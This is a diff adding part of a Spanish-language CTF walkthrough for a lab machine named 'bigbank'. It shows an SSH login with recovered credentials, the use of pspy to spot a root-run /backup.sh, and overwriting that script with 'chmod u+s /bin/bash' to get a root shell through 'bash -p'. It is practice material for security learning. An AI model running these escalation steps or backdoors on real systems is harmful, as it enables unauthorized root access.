@@ -205,3 +205,92 @@ curl -s -X GET 'http://172.17.0.2/api/admin/backup' \
 
 
 
+Descomprimimos y vemos un archivo con algo interesante:
+
+![CTF](images/bigbank/21.png)
+
+
+el user y password:
+
+```
+charlie chocolate
+```
+
+## ESCALADA DE PRIVILEGIOS
+
+Nos conectamos por SSH:
+```bash
+ssh charlie@172.17.0.2
+```
+cuando nos pida la contraseña `chocolate`
+
+![CTF](images/bigbank/22.png)
+
+miramos grupos, binarios...y nada así pues nos vamos mirar los procesos que se estan ejecutando.
+
+nos descargamos pspy de:
+```bash
+https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1
+```
+y lo pasamos a la maquina de esta manera, nos situamos donde tengamos el pspy64 descargado:
+
+```bash
+scp pspy64 charlie@172.17.0.2:/tmp/
+```
+
+
+![CTF](images/bigbank/23.png)
+
+
+damos permisos de ejecucion:
+
+```bash
+chmod +x pspy64
+```
+
+
+![CTF](images/bigbank/24.png)
+
+
+y lo ejecutamos:
+
+
+```bash
+./pspy64
+```
+
+
+![CTF](images/bigbank/26.png)
+
+
+
+y vemos esto
+
+```
+/bin/bash /backup.sh
+```
+
+comprobamos los permisos que tiene:
+
+```bash
+ls -la /backup.sh
+```
+
+![CTF](images/bigbank/27.png)
+
+
+podemos modificar el archivo:
+
+```bash
+echo "chmod u+s /bin/bash" > /backup.sh
+```
+
+y esperamos a que tenga permisos y ejecutamos:
+
+```bash
+bash -p
+```
+
+y ya somos root
+
+![CTF](images/bigbank/28.png)
